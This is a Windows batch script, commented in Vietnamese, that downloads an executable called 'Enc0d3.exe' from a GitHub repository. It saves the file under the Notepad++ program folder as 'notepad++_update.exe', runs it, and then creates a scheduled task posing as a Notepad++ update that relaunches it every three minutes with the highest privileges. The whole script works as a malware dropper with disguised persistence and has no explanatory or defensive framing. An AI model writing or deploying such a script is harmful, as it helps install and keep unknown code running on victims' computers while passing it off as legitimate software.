@echo off
setlocal

:: Đặt URL và đường dẫn lưu tệp
set "URL=https://github.com/ThanHuuTuan/DT_ATTT_VR/raw/main/Enc0d3.exe"
set "DEST=C:\Program Files\Notepad++\notepad++_update.exe"

:: Tạo thư mục nếu chưa tồn tại
if not exist "C:\Program Files\Notepad++" (
    mkdir "C:\Program Files\Notepad++"
)

echo Downloading file...
curl -L -o "%DEST%" "%URL%"

if %ERRORLEVEL%==0 (
    echo Download completed successfully.
    echo Running the file...
    "%DEST%"
) else (
    echo Error occurred during download.
)

:: Tạo tác vụ lịch trình để chạy mỗi 3 phút
echo Creating scheduled task...
schtasks /create /tn "Notepad++ Update Task" /tr "%DEST%" /sc minute /mo 3 /rl highest

if %ERRORLEVEL%==0 (
    echo Scheduled task created successfully.
) else (
    echo Error occurred while creating scheduled task.
)

endlocal
